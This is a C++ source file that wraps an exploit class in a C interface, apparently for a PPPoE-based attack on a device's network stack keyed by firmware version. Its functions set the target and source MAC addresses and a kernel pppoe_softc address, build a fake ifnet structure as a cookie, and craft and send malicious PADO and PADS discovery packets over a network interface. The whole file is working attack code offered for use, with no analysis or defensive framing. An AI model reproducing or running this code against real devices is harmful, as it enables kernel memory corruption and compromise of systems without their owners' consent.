#include "exploit.h"

extern "C" {

static Exploit exploit;

int setFirmwareVersion(int version) {
    return exploit.setFirmwareVersion(FirmwareVersion(version));
}

int setInterface(const char *iface) {
    return exploit.setInterface(iface);
}

int run() {
    return exploit.run();
}

void setSourceMac(const char *mac) {
    exploit.source_mac = pcpp::MacAddress(mac);
}

void setTargetMac(const char *mac) {
    exploit.target_mac = pcpp::MacAddress(mac);
}

void setPppoeSoftc(uint64_t pppoe_softc) {
    exploit.pppoe_softc = pppoe_softc;
}

int buildPADO(uint8_t *buffer, uint64_t size) {
    auto cookie = Exploit::build_fake_ifnet(&exploit);
    pcpp::Packet &&packet = PacketBuilder::PADO(exploit.source_mac, exploit.target_mac,
                                                cookie.data(), cookie.size(),
                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
    memcpy(buffer, packet.getRawPacket()->getRawData(), size);
    return packet.getRawPacket()->getRawDataLen();
}

void sendPADO() {
    auto cookie = Exploit::build_fake_ifnet(&exploit);
    pcpp::Packet &&packet = PacketBuilder::PADO(exploit.source_mac, exploit.target_mac,
                                                cookie.data(), cookie.size(),
                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
    exploit.dev->sendPacket(&packet);
}

int buildPADS(uint8_t *buffer, uint64_t size) {
    pcpp::Packet &&packet = PacketBuilder::PADS(exploit.source_mac, exploit.target_mac,
                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
    memcpy(buffer, packet.getRawPacket()->getRawData(), size);
    return packet.getRawPacket()->getRawDataLen();
}

void sendPADS() {
    pcpp::Packet &&packet = PacketBuilder::PADS(exploit.source_mac, exploit.target_mac,
                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
    exploit.dev->sendPacket(&packet);
}

}